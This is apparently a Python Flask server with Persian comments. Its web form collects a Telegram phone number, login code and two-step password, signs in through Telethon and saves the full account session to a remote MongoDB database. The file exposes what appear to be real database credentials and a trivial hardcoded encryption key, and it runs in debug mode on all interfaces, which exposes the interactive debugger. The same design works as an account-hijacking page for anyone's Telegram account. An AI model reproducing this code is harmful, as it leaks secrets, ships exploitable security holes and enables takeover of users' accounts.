# ============================================================
# self_login_server_mongo_fixed.py — نسخه کامل و اصلاح‌شده
# ============================================================

import os
import json
import asyncio
import threading
from datetime import datetime
from time import sleep
import base64

from flask import Flask, request, jsonify, render_template_string
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError,
    AuthRestartError
)

from Crypto.Cipher import AES
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure

from self_config import self_config
CONF = self_config()

# ============================================================
# CONFIG TELEGRAM
# ============================================================

api_id = int(CONF.api_id)
api_hash = CONF.api_hash

# کلید باید دقیقاً 32 بایت باشد
SESSION_SECRET = b"1234567890ABCDEF1234567890ABCDEF"

# ============================================================
# CONFIG MONGO
# ============================================================

MONGO_URI = "mongodb://self_login:tiam_jinx@ac-nbipb9g-shard-00-00.v2vzh9e.mongodb.net:27017,ac-nbipb9g-shard-00-01.v2vzh9e.mongodb.net:27017,ac-nbipb9g-shard-00-02.v2vzh9e.mongodb.net:27017/?replicaSet=atlas-qppgrd-shard-0&ssl=true&authSource=admin"

try:
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    mongo_client.admin.command("ping")  # بررسی واقعی اتصال
    db = mongo_client["telegram_sessions"]
    sessions_collection = db["sessions"]
    print("[MongoDB] Connected ✅")
except ConnectionFailure as e:
    db = None
    sessions_collection = None
    print("[MongoDB] Connection failed:", e)

# ============================================================
# APP
# ============================================================

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, "logs")
os.makedirs(LOG_DIR, exist_ok=True)

GLOBAL_LOOP = asyncio.new_event_loop()
def start_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()
threading.Thread(target=start_loop, args=(GLOBAL_LOOP,), daemon=True).start()

# ============================================================
# Logging
# ============================================================

def log(text):
    t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{t}] {text}"
    print(line)
    try:
        with open(os.path.join(LOG_DIR, "main.log"), "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass

# ============================================================
# Memory
# ============================================================

PENDING_LOGIN = {}
ACTIVE_ACCOUNTS = {}
LAST_SEND_TIME = {}

# ============================================================
# Crypto
# ============================================================

def encrypt_bytes(data: bytes) -> str:
    cipher = AES.new(SESSION_SECRET, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

def decrypt_bytes(data_str: str) -> bytes:
    raw = base64.b64decode(data_str)
    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
    cipher = AES.new(SESSION_SECRET, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

# ============================================================
# MongoDB Helpers
# ============================================================

def save_session_mongo(account: str, phone: str, session_str: str):
    if sessions_collection is None:
        log("Cannot save session: MongoDB not connected")
        return
    enc = encrypt_bytes(session_str.encode())
    data = {
        "account_name": account,
        "phone": phone,
        "session_data": enc,
        "updated_at": datetime.utcnow()
    }
    sessions_collection.update_one(
        {"account_name": account, "phone": phone},
        {"$set": data},
        upsert=True
    )

def load_session_mongo(account: str, phone: str):
    if sessions_collection is None:
        return None
    doc = sessions_collection.find_one({"account_name": account, "phone": phone})
    if doc and "session_data" in doc:
        return decrypt_bytes(doc["session_data"])
    return None

# ============================================================
# Utils
# ============================================================

def normalize_phone(phone: str) -> str:
    if not phone:
        return ""
    p = phone.strip().replace(" ", "").replace("-", "")
    if p.startswith("09"):
        return "+98" + p[1:]
    if p.startswith("9"):
        return "+98" + p
    if p.startswith("0098"):
        return "+" + p[2:]
    if p.startswith("98"):
        return "+98" + p[2:]
    return p

def can_send_now(phone: str) -> bool:
    now = datetime.now().timestamp()
    last = LAST_SEND_TIME.get(phone, 0)
    if now - last < 20:
        return False
    LAST_SEND_TIME[phone] = now
    return True

def build_username(me):
    # تغییر: اولویت نمایش username، بعد first_name و last_name
    if getattr(me, "username", None):
        return me.username
    if getattr(me, "first_name", None) and getattr(me, "last_name", None):
        return f"{me.first_name}_{me.last_name}"
    if getattr(me, "first_name", None):
        return me.first_name
    return f"user_{me.id}"

# ============================================================
# Telegram Client
# ============================================================

def create_client(account: str, phone: str, force_new=False):
    sess = None if force_new else load_session_mongo(account, phone)
    client = TelegramClient(f"{account}_{phone}", api_id, api_hash)
    if sess:
        try:
            client.session.load_from_string(sess.decode() if isinstance(sess, bytes) else sess)
        except Exception as e:
            log(f"Error loading session for {account} {phone}: {e}")
    return client

# ============================================================
# HTML
# ============================================================

HOME_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>Telegram Login</title>
<style>body{background:#0f172a;color:#e2e8f0;font-family:tahoma;text-align:center;padding:20px}
.box{background:#1e293b;padding:20px;border-radius:16px;max-width:420px;margin:auto}
input,button{width:100%;padding:12px;margin:6px 0;border:0;border-radius:8px;font-size:14px}
button{background:#22c55e;color:black;font-weight:bold;cursor:pointer}
.hidden{display:none}
#popup{background:#22c55e;color:black;padding:10px 20px;border-radius:10px;position:fixed;top:20px;left:50%;transform:translateX(-50%);display:none;font-weight:bold}
</style></head><body>
<div id="popup"></div><div class="box"><h3>ورود به تلگرام</h3>
<div id="slot_phone"><input id="account" placeholder="نام اکانت">
<input id="phone" placeholder="شماره مثال: 09123456789">
<button onclick="sendCode()">ارسال کد</button></div>
<div id="slot_code" class="hidden"><input id="code" placeholder="کد دریافتی">
<button onclick="verifyCode()">تایید کد</button></div>
<div id="slot_password" class="hidden"><input id="password" placeholder="رمز دوم">
<button onclick="verifyPassword()">تایید رمز</button></div></div>
<script>
function popup(msg){let p=document.getElementById("popup");p.innerHTML=msg;p.style.display="block";setTimeout(()=>{p.style.display="none";},4000);}
function sendCode(){
let account=document.getElementById("account").value;
let phone=document.getElementById("phone").value;
fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({account,phone})})
.then(r=>r.json()).then(d=>{popup(d.message);if(d.ok){document.getElementById("slot_phone").classList.add("hidden");document.getElementById("slot_code").classList.remove("hidden");}});}
function verifyCode(){
let code=document.getElementById("code").value;
let account=document.getElementById("account").value;
let phone=document.getElementById("phone").value;
fetch("/verify_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({account,phone,code})})
.then(r=>r.json()).then(d=>{popup(d.message);if(d.need_password){document.getElementById("slot_code").classList.add("hidden");document.getElementById("slot_password").classList.remove("hidden");}});}
function verifyPassword(){
let password=document.getElementById("password").value;
let account=document.getElementById("account").value;
let phone=document.getElementById("phone").value;
fetch("/verify_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({account,phone,password})})
.then(r=>r.json()).then(d=>{popup(d.message);});}
</script></body></html>"""

# ============================================================
# Routes
# ============================================================

@app.route("/")
def index():
    return render_template_string(HOME_HTML)

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.get_json()
    account = data.get("account")
    phone = normalize_phone(data.get("phone", ""))
    if not phone.startswith("+"):
        return jsonify({"ok": False, "message": "فرمت شماره اشتباه است"})
    if not can_send_now(phone):
        return jsonify({"ok": False, "message": "چند لحظه بعد دوباره امتحان کنید"})

    client = create_client(account, phone, force_new=True)

    async def runner():
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            PENDING_LOGIN[(account, phone)] = client
            return {"ok": True, "message": "کد ارسال شد ✅"}
        except PhoneNumberInvalidError:
            return {"ok": False, "message": "شماره نامعتبر است"}
        except FloodWaitError as e:
            return {"ok": False, "message": f"{e.seconds} ثانیه صبر کنید"}
        except AuthRestartError:
            return {"ok": False, "message": "تلگرام خطای داخلی دارد، دوباره امتحان کنید"}
        except Exception as e:
            log(f"send_code error for {phone}: {e}")
            return {"ok": False, "message": "خطا در ارسال کد"}

    future = asyncio.run_coroutine_threadsafe(runner(), GLOBAL_LOOP)
    return jsonify(future.result())

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.get_json()
    account = data.get("account")
    phone = normalize_phone(data.get("phone", ""))
    code = data.get("code")
    key = (account, phone)
    client = PENDING_LOGIN.get(key)
    if not client:
        return jsonify({"ok": False, "message": "درخواستی یافت نشد"})

    async def runner():
        try:
            await client.sign_in(phone, code)
        except PhoneCodeInvalidError:
            return {"ok": False, "message": "کد اشتباه است"}
        except SessionPasswordNeededError:
            return {"ok": True, "need_password": True, "message": "رمز دوم لازم است"}
        except Exception as e:
            log(f"verify_code error for {phone}: {e}")
            return {"ok": False, "message": "خطا در تایید کد"}

        me = await client.get_me()
        username = build_username(me)
        save_session_mongo(account, phone, client.session.save_to_string())
        ACTIVE_ACCOUNTS[key] = client
        if key in PENDING_LOGIN: del PENDING_LOGIN[key]
        return {"ok": True, "need_password": False, "message": f"ورود موفق ✅ {username}"}

    future = asyncio.run_coroutine_threadsafe(runner(), GLOBAL_LOOP)
    return jsonify(future.result())

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.get_json()
    account = data.get("account")
    phone = normalize_phone(data.get("phone", ""))
    password = data.get("password")
    key = (account, phone)
    client = PENDING_LOGIN.get(key)
    if not client:
        return jsonify({"ok": False, "message": "درخواستی یافت نشد"})

    async def runner():
        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            username = build_username(me)
            save_session_mongo(account, phone, client.session.save_to_string())
            ACTIVE_ACCOUNTS[key] = client
            if key in PENDING_LOGIN: del PENDING_LOGIN[key]
            return {"ok": True, "message": f"با موفقیت وارد شدید ✅ {username}"}
        except Exception as e:
            log(f"verify_password error for {phone}: {e}")
            return {"ok": False, "message": "رمز دوم اشتباه است"}

    future = asyncio.run_coroutine_threadsafe(runner(), GLOBAL_LOOP)
    return jsonify(future.result())

# ============================================================
# Run HTTP
# ============================================================

if __name__ == "__main__":
    log("SERVER STARTED → listening on 0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000, debug=True)
